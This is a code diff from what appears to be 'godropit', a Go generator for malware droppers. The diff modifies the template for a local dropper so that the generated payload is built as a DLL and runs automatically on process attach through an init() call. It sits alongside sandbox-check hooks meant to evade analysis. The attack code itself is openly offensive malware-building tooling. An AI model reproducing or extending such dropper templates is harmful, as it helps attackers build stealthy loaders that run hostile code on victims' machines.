@@ -5,6 +5,7 @@ import (
 	"log"
 	"text/template"
 
+	"github.com/Epictetus24/godropit/internal/gengo/delivery"
 	"github.com/Epictetus24/godropit/pkg/dropfmt"
 )
 
@@ -27,6 +28,8 @@ type LocalDropper struct {
 	Domain     string
 	Import     string
 	C          string
+	ProcAttach string
+	Init       string
 }
 
 var FuncName = "checkData"
@@ -40,11 +43,12 @@ var Hold = `
 
 const LocalMain = `package main
 
+{{.C}}
+
 import (
 	{{.Import}}
-	{{.C}}
-	{{.BoxChkImp}}
 
+	{{.BoxChkImp}}
 )
 
 const (
@@ -64,8 +68,11 @@ var hope = "{{.Domain}}"
 
 {{.BoxChkFunc}}
 
+{{.ProcAttach}}
+
 func init() {
 	{{.ChkBox}}	
+	{{.Init}}()
 }
 func main() {
 
@@ -111,9 +118,11 @@ func (cd *LocalDropper) WriteSharedSrc(writer io.Writer) error {
 	if err != nil {
 		return err
 	}
-	cd.C = `"C"`
+	cd.C = delivery.DllImport
+	cd.ProcAttach = delivery.DllFunc
 	cd.FuncName = FuncName
 	cd.Export = Export
+	cd.Init = cd.FuncName
 	err = tmpl.Execute(writer, cd)
 	return nil
 
